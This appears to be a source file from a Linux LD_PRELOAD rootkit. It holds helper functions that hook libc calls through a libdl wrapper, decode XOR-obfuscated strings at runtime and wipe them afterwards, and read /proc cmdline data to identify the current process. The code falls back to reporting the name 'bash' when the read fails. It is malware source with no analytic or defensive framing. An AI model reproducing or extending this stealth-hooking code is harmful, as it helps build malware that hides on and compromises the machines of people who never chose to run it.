#include "../hooks/libdl/libdl.h"

char *get_process_name(pid_t pid){
    char *process_name = (char *)malloc(512),
         process_path[PATH_MAX];
    FILE *cmdline_fp;

    hook(CFOPEN);

    xor(cmdline_path, CMDLINE_PATH);
    (void)snprintf(process_path, sizeof(process_path) - 1, cmdline_path, pid);
    clean(cmdline_path);

    if((cmdline_fp = call(CFOPEN, process_path, "r")) == NULL){
        xor(bstr, BASH_STR);
        (void)snprintf(process_name, 5, bstr);
        clean(bstr);
    }else (void)fread(process_name, 255, 1, cmdline_fp);
    if(cmdline_fp) (void)fclose(cmdline_fp);
    
    return process_name;
}

int cmp_process(char *name){
    get_process_info();
    return !strncmp(process_info.myname, name, strlen(name));
}
char *str_process(char *name){
    get_process_info();
    return strstr(process_info.myname, name);
}
int process(char *name)
{
    if(cmp_process(name)) return 1;
    if(str_process(name)) return 1;
    return 0;
}
int xprocess(const char *name){
    int ret = 0;
    xor(_name, name);
    if(cmp_process(_name)) ret = 1;
    if(str_process(_name)) ret = 1;
    clean(_name);
    return ret;
}

char *get_process_cmdline(pid_t pid){
    int c, fd;
    char *process_cmdline = (char *)malloc(512),
         process_path[PATH_MAX];

    hook(COPEN,
         CREAD);

    xor(cmdline_path, CMDLINE_PATH);
    (void)snprintf(process_path, sizeof(process_path) - 1, cmdline_path, pid);
    clean(cmdline_path);

    if((fd = (long)call(COPEN, process_path, 0, 0)) < 0){
        xor(bstr, BASH_STR);
        (void)snprintf(process_cmdline, 5, bstr);
        clean(bstr);
    }else{
        c = (long)call(CREAD, fd, process_cmdline, 512);
        for(int i = 0; i < c; i++) if(process_cmdline[i] == 0x00) process_cmdline[i] = 0x20;
    }
    if(fd) (void)close(fd);
    return process_cmdline;
}

void get_process_info(void){
    pid_t pid = getpid();
    uid_t uid = getuid(),
          euid = geteuid();
    gid_t gid = getgid();
    char *process_name = get_process_name(pid),
         *process_cmdline = get_process_cmdline(pid);

    /* process info might have changed since our last execution... */
    if(strncmp(process_info.myname, process_name, sizeof(process_info.myname)))
        (void)strncpy(process_info.myname, process_name, sizeof(process_info.myname));
    free(process_name);

    if(strncmp(process_info.mycmdline, process_cmdline, sizeof(process_info.mycmdline)))
        (void)strncpy(process_info.mycmdline, process_cmdline, sizeof(process_info.mycmdline));
    free(process_cmdline);

    process_info.mypid = pid;
    process_info.myuid = uid;
    process_info.myeuid = euid;
    process_info.mygid = gid;
}